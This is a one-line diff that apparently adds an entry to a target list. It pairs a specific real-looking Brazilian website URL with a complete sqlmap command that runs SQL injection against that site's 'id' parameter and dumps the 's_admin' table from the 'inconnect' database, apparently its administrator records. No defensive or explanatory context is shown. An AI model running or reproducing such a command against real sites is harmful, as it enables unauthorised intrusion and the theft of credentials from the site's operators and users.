@@ -1,0 +1,1 @@
+https://www.inconnect.com.br/exibeNoticia.php?id=25 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.inconnect.com.br/exibeNoticia.php?id=25 -D inconnect -T s_admin --dump
